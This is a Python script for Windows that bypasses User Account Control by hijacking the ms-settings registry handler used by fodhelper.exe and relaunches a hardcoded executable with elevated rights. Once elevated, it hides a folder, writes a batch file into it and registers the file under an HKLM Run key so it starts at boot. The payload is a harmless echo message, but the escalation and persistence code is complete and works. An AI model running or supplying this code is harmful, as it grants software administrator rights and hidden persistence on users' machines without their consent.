from __future__ import print_function
import os
import sys
import ctypes


import winreg as winreg 
from pathlib import Path

CMD = r"C:\Windows\System32\cmd.exe" 
FOD_HELPER = r'C:\Windows\System32\fodhelper.exe' 
PYTHON_CMD = "start" 
REG_PATH = 'Software\Classes\ms-settings\shell\open\command' 
DELEGATE_EXEC_REG_KEY = 'DelegateExecute' 
def is_admin(): 
    ''' Checks if the script is running with administrative privileges. Returns True if is running as admin, False otherwise. ''' 
    try: 
        return ctypes.windll.shell32.IsUserAnAdmin() 
    except: 
        return False 

def create_reg_key(key, value): 
    ''' Creates a reg key ''' 
    try: 
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH) 
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE) 
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value) 
        winreg.CloseKey(registry_key) 
    except WindowsError: 
        raise 
def bypass_uac(cmd):

    try: 
        create_reg_key(DELEGATE_EXEC_REG_KEY, '') 
        create_reg_key(None, cmd)
    except WindowsError: 
        raise 

path = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\'
folder = 'C:\\Program_File\\'
executing = 'C:\\Program_File\\volleyballsquid.bat'

def angel():
    #ctypes.windll.shell32.ShellExecuteW(None,"runas",sys.executable,__file__,None,1)
    try:
        

        if(os.path.exists(folder) == False):
            os.mkdir(folder) 
        f = open(executing, "w")
        f.write("echo Hello!! I love playing volleyball!!\npause\n")
        f.close()
        FILE_ATTRIBUTE_HIDDEN = 0x02
        ret = ctypes.windll.kernel32.SetFileAttributesW(folder, FILE_ATTRIBUTE_HIDDEN)

        commands = "reg add HKEY_LOCAL_MACHINE\\" + path + " /v VolleyballSquid /t REG_SZ /d \"" + executing + "\" /f"
        print(commands)
        os.system(commands)

        '''
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, path)
        winreg.SetValueEx(key, 'VolleyballSquid', 0, winreg.REG_SZ, executing)
        winreg.CloseKey(key)
        '''

    except WindowsError:
        raise

    return


def execute(): 
    if not is_admin(): 
        print('[!] The script is NOT running with administrative privileges') 
        print('[+] Trying to bypass the UAC') 
        try: 
            #current_dir = __file__
            #current_dir = os.getcwd() + '\\' + Path(os.path.basename(__file__)).stem + '.exe'
            current_dir = 'C:\\Squid\\volleysquid.exe'
            print(current_dir)
            
            cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, current_dir) 
            bypass_uac(cmd) 
            os.system(FOD_HELPER) 
            
            sys.exit(0) 
        except WindowsError: 
            sys.exit(1) 
    else: 
        angel()
        
        return

if __name__ == '__main__': 
    execute()
